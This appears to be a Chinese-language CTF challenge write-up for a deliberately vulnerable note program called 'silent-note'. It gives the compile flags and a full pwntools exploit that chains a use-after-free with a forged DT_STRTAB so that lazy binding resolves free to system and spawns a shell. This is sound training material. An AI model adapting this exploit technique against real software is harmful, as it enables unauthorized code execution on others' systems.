# silent-note

UAF利用与延迟绑定机制利用

难点：利用延迟绑定机制getshell

## 编译方法

```
gcc silent-note.c -o silent-note -O0 -fstack-protector-all -z noexecstack -fPIE -no-pie -s -z norelro
```

说明：

+ `-fstack-protector-all`全面开启canary防护
+ `-z noexecstack`开启NX防护
+ `-fPIE -no-pie`关闭内存随机化
+ `-O0`关闭代码优化
+ `-s`删除调试符号
+ `-z norelro`关闭RELRO保护，使关键字段可以改写

## exp

没有任何回显，无法通过泄露libc地址计算system等函数的地址

getshell原理：通过伪造`DYNAMIC`段中`DT_STRTAB`对函数进行定位的字符串表，来控制延迟绑定时所绑定的函数

```python
#!/usr/bin/python
# -*- coding: utf8 -*-

from __future__ import print_function
from pwn import *

context.log_level='debug'

elf = ELF('./silent-note')
io = process('./silent-note')

def new_note(size, content):
    io.sendline('1')
    io.sendline(str(size))
    io.send(content)

def edit_note(index, content):
    io.sendline('2')
    io.sendline(str(index))
    io.send(content)

def delete_note(index):
    io.sendline('3')
    io.sendline(str(index))



new_note(128, 'a' * 128)
new_note(128, 'b' * 128)
new_note(8, '/bin/sh\x00')
delete_note(0)
delete_note(1)
new_note(16, p64(256) + p64(elf.bss() + 0x800))
payload = '\x00libc.so.6\x00exit\x00__isoc99_scanf\x00__stack_chk_fail\x00stdin\x00calloc\x00memset\x00read\x00stdout\x00mprotect\x00stderr\x00setvbuf\x00__libc_start_main\x00system\x00'.ljust(256, 'c')
edit_note(0, payload)
edit_note(3, p64(8) + p64(0x601EB0))
edit_note(0, p64(elf.bss() + 0x800))
edit_note(3, p64(8) + p64(elf.got['free']))
edit_note(0, p64(0x4006C6))
delete_note(2)

io.interactive()

```